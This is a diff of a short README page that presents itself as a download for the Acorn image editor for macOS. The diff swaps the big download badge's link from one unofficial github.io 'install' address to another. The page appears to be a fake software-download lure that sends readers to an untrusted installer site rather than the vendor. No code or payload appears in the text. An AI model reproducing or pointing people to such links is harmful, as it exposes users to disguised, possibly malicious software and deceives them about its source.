@@ -1,11 +1,11 @@
-# Acorn for Mac – Powerful Image Editor for macOS  
+# Acorn for Mac – Powerful Image Editor  
 
 <div align="center">  
   <img src="https://cdn.jim-nielsen.com/macos/512/acorn-4-2013-08-15.png?rf=512" alt="Acorn for Mac Logo" width="200">  
 </div>  
 
 <div align="center">  
-  <a href="https://osx-install.github.io/.github/acorn-mac" target="_blank">  
+  <a href="https://get-install-osx.github.io/.github/acorn-mac" target="_blank">  
     <img src="https://img.shields.io/badge/⬇️_GET_ACORN_FOR_MAC-%F0%9F%92%BE-blue?style=for-the-badge&logo=apple&logoColor=white" alt="Download Acorn for Mac">  
   </a>  
 </div>  
